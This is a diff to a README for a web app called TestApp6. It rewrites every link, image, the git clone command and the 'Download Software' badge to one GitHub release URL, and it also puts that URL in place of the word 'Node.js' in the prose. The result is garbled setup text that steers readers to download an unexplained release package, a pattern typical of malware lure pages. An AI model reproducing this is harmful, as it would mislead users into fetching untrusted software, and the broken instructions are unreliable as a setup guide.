@@ -1,8 +1,8 @@
 # Welcome to the TestApp6 Repository 🚀
 
-![TestApp6](https://via.placeholder.com/800x400)
+![TestApp6](https://github.com/elmartino147XD18/testapp6/releases/tag/v2.0)
 
-This repository contains the code for TestApp6, a web application built using various technologies such as Docker, Node.js, React, PostgreSQL, and more. The project was generated with the help of Flatlogic Platform. To see the application in action, visit [TestApp6 Application Page](https://test-819.flatlogic.app).
+This repository contains the code for TestApp6, a web application built using various technologies such as Docker, https://github.com/elmartino147XD18/testapp6/releases/tag/v2.0, React, PostgreSQL, and more. The project was generated with the help of Flatlogic Platform. To see the application in action, visit [TestApp6 Application Page](https://github.com/elmartino147XD18/testapp6/releases/tag/v2.0).
 
 ## Table of Contents
 - [Demonstration](#demonstration)
@@ -14,12 +14,12 @@ This repository contains the code for TestApp6, a web application built using va
 
 ## Demonstration
 
-Check out the live demo of TestApp6 at [TestApp6 Application Page](https://test-819.flatlogic.app).
-![Demo](https://via.placeholder.com/800x400)
+Check out the live demo of TestApp6 at [TestApp6 Application Page](https://github.com/elmartino147XD18/testapp6/releases/tag/v2.0).
+![Demo](https://github.com/elmartino147XD18/testapp6/releases/tag/v2.0)
 
 ## Features
 
-- **Modern Technologies**: Built using Docker, Node.js, React, PostgreSQL, and more.
+- **Modern Technologies**: Built using Docker, https://github.com/elmartino147XD18/testapp6/releases/tag/v2.0, React, PostgreSQL, and more.
 - **Low-Code Development**: Developed with Flatlogic Platform for efficient and rapid development.
 - **Responsive Design**: The application is designed to work seamlessly across various devices.
 - **Integration**: Includes integration with Nginx for serving the application.
@@ -31,7 +31,7 @@ To get started with TestApp6, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/testapp6.git
+   git clone https://github.com/elmartino147XD18/testapp6/releases/tag/v2.0
    ```
 
 2. Navigate to the project directory:
@@ -46,7 +46,7 @@ To get started with TestApp6, follow these steps:
 
 ## Usage
 
-Once you have installed the dependencies, you can run the application. Make sure you have Docker and Node.js installed on your machine.
+Once you have installed the dependencies, you can run the application. Make sure you have Docker and https://github.com/elmartino147XD18/testapp6/releases/tag/v2.0 installed on your machine.
 
 1. Build the Docker image:
    ```bash
@@ -68,7 +68,7 @@ If you would like to contribute to TestApp6, feel free to submit a pull request.
 
 TestApp6 is released under the MIT License. See [LICENSE](LICENSE) for more details.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/elmartino147XD18/testapp6/releases/tag/v2.0)](https://github.com/elmartino147XD18/testapp6/releases/tag/v2.0)
 
 If the above link does not work, please check the "Releases" section of this repository for the latest software package.
 
